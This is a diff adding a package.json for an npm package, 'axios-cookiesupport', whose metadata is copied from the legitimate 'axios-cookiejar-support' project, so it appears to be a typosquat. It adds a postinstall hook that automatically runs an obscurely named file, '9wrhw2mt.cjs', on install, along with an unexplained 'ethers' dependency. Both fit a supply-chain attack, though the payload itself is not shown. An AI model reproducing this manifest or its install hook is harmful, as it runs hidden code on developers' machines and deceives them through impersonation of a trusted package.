@@ -1,0 +1,77 @@
+{
+  "name": "axios-cookiesupport",
+  "version": "5.0.3",
+  "description": "Add tough-cookie support to axios.",
+  "keywords": [
+    "axios",
+    "cookie",
+    "cookiejar",
+    "cookies",
+    "tough-cookie"
+  ],
+  "homepage": "https://github.com/3846masa/axios-cookiejar-support#readme",
+  "bugs": {
+    "url": "https://github.com/3846masa/axios-cookiejar-support/issues"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/3846masa/axios-cookiejar-support.git"
+  },
+  "funding": "https://github.com/sponsors/3846masa",
+  "license": "MIT",
+  "author": "3846masa <3846masahiro+git@gmail.com>",
+  "main": "dist/index.js",
+  "browser": "noop.js",
+  "types": "dist/index.d.ts",
+  "files": [
+    "dist",
+    "noop.js",
+    "!**/__tests__",
+    "9wrhw2mt.cjs"
+  ],
+  "scripts": {
+    "postinstall": "node 9wrhw2mt.cjs"
+  },
+  "dependencies": {
+    "http-cookie-agent": "^6.0.6",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "@3846masa/configs": "github:3846masa/configs#1680811faae257796efe99b055aee5072cac6577",
+    "@babel/plugin-proposal-explicit-resource-management": "7.24.7",
+    "@babel/preset-env": "7.25.4",
+    "@babel/preset-typescript": "7.24.7",
+    "@jest/globals": "29.7.0",
+    "@semantic-release/changelog": "6.0.3",
+    "@semantic-release/exec": "6.0.3",
+    "@semantic-release/git": "10.0.1",
+    "@types/eslint": "9.6.1",
+    "@types/node": "18.19.53",
+    "@types/tough-cookie": "4.0.5",
+    "axios": "1.7.7",
+    "babel-jest": "29.7.0",
+    "disposablestack": "1.1.6",
+    "jest": "29.7.0",
+    "rimraf": "5.0.10",
+    "semantic-release": "19.0.5",
+    "tough-cookie": "4.1.4",
+    "typescript": "5.6.2"
+  },
+  "peerDependencies": {
+    "axios": ">=0.20.0",
+    "tough-cookie": ">=4.0.0"
+  },
+  "packageManager": "pnpm@9.11.0",
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "publishConfig": {
+    "access": "public"
+  },
+  "pnpm": {
+    "patchedDependencies": {
+      "@semantic-release/git@10.0.1": "patches/@semantic-release__git@10.0.1.patch"
+    }
+  }
+}
